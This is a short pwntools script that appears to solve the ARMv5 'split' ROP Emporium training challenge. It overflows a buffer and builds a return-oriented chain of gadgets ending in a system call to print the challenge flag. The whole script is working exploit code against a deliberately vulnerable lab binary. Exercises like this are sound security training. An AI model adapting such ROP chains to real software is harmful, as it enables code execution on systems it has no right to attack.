from pwn import *

context.arch = "arm"
context.log_level = "critical"

bin = "./split_armv5"
p = process(bin)
#p = gdb.debug(bin, "b*0x105e0\nc")

rop = ROP(p.elf)

rop.raw(b"i"*36)
rop.raw(p32(0x10658)) # pop r3 pc
rop.raw(p32(0x2103c)) # string
rop.raw(p32(0x10558)) # mov r3 -> r0
rop.raw(p32(0x1337))
rop.raw(p32(0x105e0)) # system gadget

p.recvuntil("> ")
p.sendline(rop.chain())
print(re.search(b"ROPE{(.+?)}", p.recvall(timeout=1)).group(0))

